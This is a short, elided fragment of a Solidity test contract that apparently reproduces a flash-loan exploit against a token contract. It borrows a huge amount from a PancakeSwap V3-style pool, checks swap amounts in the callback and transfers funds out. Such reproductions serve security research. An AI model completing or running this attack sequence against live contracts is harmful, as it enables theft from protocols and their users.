...
contract Token8633_9419_exp is Test {
    ...
    function xd8ea4b59() public {
        x92b7.flash(r, 1_100_000_000_000_000_000_000_000, 0, hex"30783030");
    }
    ...
    function pancakeV3FlashCallback(uint256, uint256, bytes memory) public {
        ...
        x10ed.getAmountsOut(1_000_000_000_000_000_000_000_000, path);
        ...
        x0cca.balanceOf(r);
        x55d3.transfer(address(x5b4d), 1_000_000_000_000_000_000_000_000);
